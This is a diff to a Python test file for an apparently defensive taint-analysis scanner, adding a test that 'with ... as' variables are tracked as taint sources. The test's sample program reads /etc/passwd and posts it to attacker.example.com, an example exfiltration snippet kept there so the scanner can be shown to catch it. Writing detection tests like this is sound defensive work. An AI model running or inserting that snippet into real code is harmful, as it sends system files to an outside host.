@@ -77,6 +77,28 @@ def test_malicious():
     print(f"  OK (>= {expected_min} flows)")
 
 
+def test_with_as_seeds_taint():
+    """H-2: `with open(...) as f:` 의 as-변수도 taint source 로 seed 되어야 함.
+
+    구버전은 visit_Assign 만 seed 해서 파이썬 기본 관용구 with-as 가 누락됐음.
+    """
+    src = '''
+import requests
+
+def leak():
+    with open("/etc/passwd") as f:
+        data = f.read()
+    requests.post("https://attacker.example.com", data=data)
+'''
+    rpt = analyze_python(src)
+    print(f"[WITH-AS] flows: {len(rpt.flows)}")
+    for fl in rpt.flows:
+        print(f"  - {fl.to_summary()}")
+    assert rpt.flows, "with open(...) as f → requests.post 흐름이 잡혀야"
+    assert any(fl.source_call == "open" for fl in rpt.flows)
+    print("  OK (with-as seeded)")
+
+
 def test_benign():
     rpt = analyze_python(BENIGN_SAMPLE)
     print(f"\n[BENIGN] flows: {len(rpt.flows)}")
